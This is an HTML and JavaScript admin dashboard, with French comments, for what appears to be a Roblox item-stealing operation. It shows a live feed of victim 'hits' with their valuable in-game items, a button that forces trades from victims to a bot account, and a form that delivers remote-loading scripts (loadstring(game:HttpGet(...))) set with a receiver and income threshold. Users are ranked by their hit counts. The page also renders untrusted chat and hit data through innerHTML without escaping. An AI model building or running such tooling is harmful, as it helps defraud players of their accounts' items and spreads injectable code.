<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="style.css">
    <title>Rusteez | Admin Panel</title>
    <style>
        #admin-lock { position: fixed; inset: 0; background: #0a0a0c; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); justify-content:center; align-items:center; z-index:1000; }
        .modal-content { background:var(--bg-sidebar); padding:20px; border-radius:8px; width:450px; border:1px solid var(--accent); }
        textarea { width:100%; height:120px; background:#000; color:var(--success); border:1px solid #333; margin-top:10px; font-family:monospace; }
        
        /* Styles pour les cartes détaillées All Hits */
        .hit-card-detail { background: #16161a; border: 1px solid #2d2d31; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
        .hit-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 0.85em; color: #a0a0a5; border-bottom: 1px solid #2d2d31; padding-bottom: 10px; margin-bottom: 10px; }
        .brainrot-list { max-height: 120px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; margin-top: 5px; }
        .brainrot-item { font-family: monospace; font-size: 0.8em; color: #00ff9d; margin-bottom: 2px; }
        .badge-receiver { background: #5865f2; color: white; font-size: 0.7em; padding: 2px 6px; border-radius: 4px; margin-right: 4px; display: inline-block; }
        
        .chat-container { display: flex; flex-direction: column; height: 75vh; background: var(--bg-card); border-radius: 8px; overflow: hidden; border: 1px solid #1a1a1c; }
        #admin-chat-messages { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; }
        .chat-input-area { display: flex; padding: 15px; background: var(--bg-sidebar); gap: 10px; border-top: 1px solid #1a1a1c; }
        .message-bubble { background: #1a1a1c; padding: 10px 15px; border-radius: 10px; width: fit-content; max-width: 80%; }
        .message-bubble small { display: block; margin-bottom: 4px; font-weight: bold; color: var(--accent); }
    </style>
</head>
<body>

    <div id="admin-lock">
        <div class="auth-card">
            <h2 style="color:var(--accent)">MASTER ACCESS</h2>
            <input type="password" id="master-input" placeholder="Enter Master Password">
            <button onclick="verifyMaster()">Unlock Panel</button>
            <p id="lock-error" style="color:var(--danger); margin-top:10px;"></p>
        </div>
    </div>

    <div id="admin-content" class="dashboard-container" style="display:none;">
        <div class="sidebar">
            <h2 style="color:var(--accent); text-align:center;">ADMIN</h2>
            <nav style="margin-top:20px;">
                <button class="tab-btn active" onclick="openTab(event, 'adm-users')">👥 Users</button>
                <button class="tab-btn" onclick="openTab(event, 'adm-all-hits')">📡 All Hits</button>
                <button class="tab-btn" onclick="openTab(event, 'adm-requests')">📜 Script Requests</button>
                <button class="tab-btn" onclick="openTab(event, 'adm-leaderboard')">🏆 Leaderboard</button>
                <button class="tab-btn" onclick="openTab(event, 'adm-chat')">💬 General Chat</button>
            </nav>
        </div>

        <div class="main-content">
            <div id="adm-users" class="tab-content active">
                <h1>Users Management</h1>
                <div id="users-list" class="hits-container"></div>
            </div>

            <div id="adm-all-hits" class="tab-content">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <h1>Global Discord Feed</h1>
                    <span id="live-indicator" style="color:var(--success); font-size:0.8em;">● LIVE</span>
                </div>
                <div id="all-hits-list"></div>
            </div>
            
            <div id="adm-requests" class="tab-content">
                <h1>Pending Requests</h1>
                <div id="requests-list"></div>
            </div>

            <div id="adm-leaderboard" class="tab-content">
                <h1>Global Leaderboard</h1>
                <div id="leaderboard-list"></div>
            </div>

            <div id="adm-chat" class="tab-content">
                <h1>General Chat Monitor</h1>
                <div class="chat-container">
                    <div id="admin-chat-messages"></div>
                    <div class="chat-input-area">
                        <input type="text" id="admin-chat-input" placeholder="Write a message as Admin...">
                        <button onclick="sendAdminChatMessage()" style="width: auto; padding: 0 25px;">Send</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="scriptModal" class="modal">
        <div class="modal-content">
            <h3>Deliver Script</h3>
            <input type="hidden" id="m-uuid">
            <label>Receiver Name:</label>
            <input type="text" id="m-rec">
            <label>Income Level:</label>
            <input type="text" id="m-inc">
            <label>Script Code:</label>
            <textarea id="m-code" placeholder="loadstring(game:HttpGet(...))()"></textarea>
            <button onclick="deliverScript()" style="margin-top:15px;">SEND TO USER</button>
            <button onclick="closeModal()" style="background:transparent; color:gray; margin-top:5px;">Cancel</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let MASTER_KEY = "";

        // --- VERIFICATION MASTER ---
        async function verifyMaster() {
            const pass = document.getElementById('master-input').value;
            const res = await fetch('/api/admin/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pass })
            });
            if (res.ok) {
                MASTER_KEY = pass;
                document.getElementById('admin-lock').style.display = 'none';
                document.getElementById('admin-content').style.display = 'flex';
                loadAll();
                loadDiscordHits(); // Charger les hits Discord
                loadChatHistory();
            } else { 
                document.getElementById('lock-error').innerText = "Invalid Password."; 
            }
        }

        // --- RENDU UNIVERSEL DES HITS ---
        function renderHitCard(h) {
            const brainrotsHtml = h.brainrots.map(b => `<div class="brainrot-item">${b}</div>`).join('');
            const receiversHtml = h.receivers.map(r => `<span class="badge-receiver">${r}</span>`).join('');

            return `
                <div class="hit-card-detail">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                        <strong style="color:var(--accent); font-size:1.1em;">👤 ${h.displayName} (@${h.username})</strong>
                        <small style="color:gray;">${new Date(h.timestamp).toLocaleTimeString()}</small>
                    </div>
                    
                    <div class="hit-info-grid">
                        <div>📅 Age: <b>${h.accountAge}</b></div>
                        <div>🖥 Exec: <b>${h.executor}</b></div>
                        <div>👥 Server: <b>${h.players}</b></div>
                        <div>😎 Receivers: <br>${receiversHtml || 'None'}</div>
                    </div>

                    <div style="margin-top:10px;">
                        <div style="font-size:0.7em; color:gray; text-transform:uppercase;">Valuable Brainrots</div>
                        <div class="brainrot-list">${brainrotsHtml}</div>
                    </div>

                    <div style="margin-top:15px; text-align:right;">
                        <button onclick="forceTrade('MagixSafe', '${h.username}')" class="btn-mini" style="background:#222; width:auto; padding:5px 12px;">Force MagixSafe</button>
                    </div>
                </div>
            `;
        }

        // --- CHARGEMENT DATA ---
        async function loadDiscordHits() {
            const res = await fetch('/api/admin/all-hits', { headers: { 'x-admin-key': MASTER_KEY } });
            const hits = await res.json();
            document.getElementById('all-hits-list').innerHTML = hits.map(renderHitCard).join('');
        }

        async function loadAll() {
            const h = { 'x-admin-key': MASTER_KEY };
            
            // Users
            const uReq = await fetch('/api/admin/users', { headers: h });
            const users = await uReq.json();
            document.getElementById('users-list').innerHTML = users.map(u => `
                <div class="hit-card">
                    <strong>${u.username}</strong> (${u.email})<br>
                    UUID: <code>${u.webhookToken}</code> | Hits: <b>${u.hitsCount || 0}</b>
                    <div style="margin-top:10px;">
                        <button onclick="deleteUser('${u._id}')" style="background:var(--danger); width:auto; padding:5px 15px;">Delete User</button>
                    </div>
                </div>
            `).join('');

            // Requests
            const rReq = await fetch('/api/admin/requests', { headers: h });
            const reqs = await rReq.json();
            document.getElementById('requests-list').innerHTML = reqs.length ? reqs.map(r => `
                <div class="hit-card" style="border-left:4px solid var(--accent);">
                    <strong>${r.username}</strong> Requesting Script<br>
                    Target: <code>${r.receivers}</code> | Income: <code>${r.minIncome}</code>
                    <button onclick="openModal('${r.webhookuuid}', '${r.receivers}', '${r.minIncome}')" style="margin-top:10px;">Process Request</button>
                </div>
            `).join('') : '<p style="color:gray;">No pending requests.</p>';

            // Leaderboard
            const sorted = [...users].sort((a,b) => (b.hitsCount || 0) - (a.hitsCount || 0));
            document.getElementById('leaderboard-list').innerHTML = sorted.map((u, i) => `
                <div style="padding:15px; background:var(--bg-sidebar); margin-bottom:8px; border-radius:5px; display:flex; justify-content:space-between; border: 1px solid #1a1a1c;">
                    <span><span style="color:var(--accent); font-weight:bold; margin-right:10px;">#${i+1}</span> <strong>${u.username}</strong></span>
                    <span style="color:var(--success); font-weight:bold;">${u.hitsCount || 0} HITS</span>
                </div>
            `).join('');
        }

        // --- TRADING & ACTIONS ---
        async function forceTrade(bot, target) {
            const res = await fetch(`/api/sendtrade?username=${bot}&receiver=${target}&key=${MASTER_KEY}`);
            const msg = await res.text();
            alert(msg);
        }

        // --- CHAT LOGIC ---
        async function loadChatHistory() {
            const res = await fetch('/api/messages');
            const messages = await res.json();
            document.getElementById('admin-chat-messages').innerHTML = "";
            messages.forEach(appendMessage);
        }

        function appendMessage(msg) {
            const container = document.getElementById('admin-chat-messages');
            const div = document.createElement('div');
            div.className = 'message-bubble';
            div.innerHTML = `<small>${msg.senderName}</small><div>${msg.content}</div>`;
            container.appendChild(div);
            container.scrollTop = container.scrollHeight;
        }

        async function sendAdminChatMessage() {
            const input = document.getElementById('admin-chat-input');
            if(!input.value.trim()) return;
            await fetch('/api/messages/send', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: "🛡️ (ADMIN): " + input.value })
            });
            input.value = "";
        }

        // --- REAL-TIME SOCKETS ---
        socket.on('new_discord_hit', (hit) => {
            const list = document.getElementById('all-hits-list');
            list.insertAdjacentHTML('afterbegin', renderHitCard(hit));
            if (list.children.length > 100) list.lastElementChild.remove();
        });

        socket.on('new_general_message', appendMessage);
        socket.on('new_script_request', loadAll);
        socket.on('stats_updated', loadAll);

        // --- UI HELPERS ---
        function openModal(uuid, rec='', inc='') {
            document.getElementById('m-uuid').value = uuid;
            document.getElementById('m-rec').value = rec;
            document.getElementById('m-inc').value = inc;
            document.getElementById('scriptModal').style.display = 'flex';
        }
        function closeModal() { document.getElementById('scriptModal').style.display = 'none'; }

        async function deliverScript() {
            const res = await fetch('/api/scripts/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-admin-key': MASTER_KEY },
                body: JSON.stringify({
                    webhookuuid: document.getElementById('m-uuid').value,
                    receiver: document.getElementById('m-rec').value,
                    minincome: document.getElementById('m-inc').value,
                    script: document.getElementById('m-code').value
                })
            });
            if(res.ok) { alert("Script Delivered!"); closeModal(); loadAll(); }
            else { alert("Error."); }
        }

        async function deleteUser(id) {
            if(!confirm("Are you sure?")) return;
            await fetch(`/api/admin/users/${id}`, { method: 'DELETE', headers: { 'x-admin-key': MASTER_KEY } });
            loadAll();
        }

        function openTab(evt, tabName) {
            const contents = document.getElementsByClassName("tab-content");
            for (let c of contents) c.classList.remove("active");
            document.getElementById(tabName).classList.add("active");
            const buttons = document.getElementsByClassName("tab-btn");
            for (let b of buttons) b.classList.remove("active");
            evt.currentTarget.classList.add("active");
        }
    </script>
</body>
</html>
